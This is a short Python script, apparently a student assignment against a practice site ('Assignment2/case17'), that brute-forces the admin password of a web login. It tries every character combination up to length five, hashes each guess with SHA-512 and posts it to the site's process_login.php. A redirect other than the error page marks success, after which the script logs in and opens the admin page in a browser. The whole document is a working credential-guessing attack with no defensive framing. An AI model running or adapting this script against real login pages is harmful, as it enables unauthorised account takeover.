import requests, hashlib, webbrowser
from itertools import product

#brute forcing the password
chars = 'hdsl0123456789abcefgijkmnopqrtuvwxyz'
admin_password = ''

def hash_password(password):
	m = hashlib.sha512()
	m.update(password)
	hashed_password = m.hexdigest()
	return hashed_password

def test_password(password):
	hashed_password = hash_password(password)
	r = requests.post("http://wsb.com/Assignment2/case17/includes/process_login.php", data={'email': 'admin@admin.com', 'p': hashed_password}, allow_redirects=False)
	#if r.headers["location"] == "../login.php?error=1":
		# print(password + " failed")
	#else:
	if r.headers["location"] != "../login.php?error=1":
		print("PASSWORD FOUND: " + password)
	return r.headers["location"] != "../login.php?error=1"


for length in range(1, 6):
	found = False
	to_attempt = product(chars, repeat=length)
	for attempt in to_attempt:
		if test_password(''.join(attempt)):
			found = True
			admin_password = ''.join(attempt)
			break
	if found:
		break
# performing the login and showing in browser
url = 'http://www.wsb.com/Assignment2/case17/includes/process_login.php'
hashed_admin_password = hash_password(admin_password)
values = {'email' : 'admin@admin.com', 'p' : ''.join(hashed_admin_password)}

r = requests.post(url, values)

with open('results.html', 'w') as f:
	f.write(r.text)

new = 2
webbrowser.open('results.html', new=new)

